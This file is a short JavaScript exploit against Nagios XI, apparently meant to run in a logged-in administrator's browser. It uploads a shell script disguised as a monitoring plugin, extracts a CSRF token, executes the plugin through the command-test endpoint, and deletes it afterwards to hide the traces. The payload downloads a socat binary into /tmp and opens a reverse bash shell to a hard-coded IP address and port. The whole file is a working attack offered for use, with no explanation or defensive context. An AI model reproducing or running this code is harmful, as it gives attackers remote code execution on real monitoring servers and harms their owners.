var rev_shell_ip = '192.168.100.47';
var rev_shell_port = '22473';
var plugin_name = 'check_rce.sh';
var nsp = window.nsp_str || window.top.nsp_str;
var rce_payload = `
#!/bin/sh

cd /tmp
wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true -O socat
chmod +x socat
ls -la
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${rev_shell_ip}:${rev_shell_port}
`;

// Upload plugin with the above payload
var fd = new FormData();
fd.append('upload', 1);
fd.append('nsp', nsp);
fd.append('uploadedfile', new Blob([rce_payload]), plugin_name);
fetch('/nagiosxi/admin/monitoringplugins.php', { method: 'POST', body: fd })
  .then(function() {
    // Now we need to grab the CSRF token
    return fetch('/nagiosxi/includes/components/ccm/index.php?cmd=insert&type=command');
  })
  .then(function(res) {
    return res.text();
  })
  .then(function(page) {
    // Extract token
    var found = page.match(/token" type="hidden" value="(\w+)"/);
    // Run plugin code
    return fetch(`/nagiosxi/includes/components/ccm/command_test.php?cmd=help&mode=help&plugin=${plugin_name}&token=${found[1]}`);
  })
  .then(function() {
    // clean up
    return fetch(`/nagiosxi/admin/monitoringplugins.php?delete=${plugin_name}&nsp=${nsp}`);
  });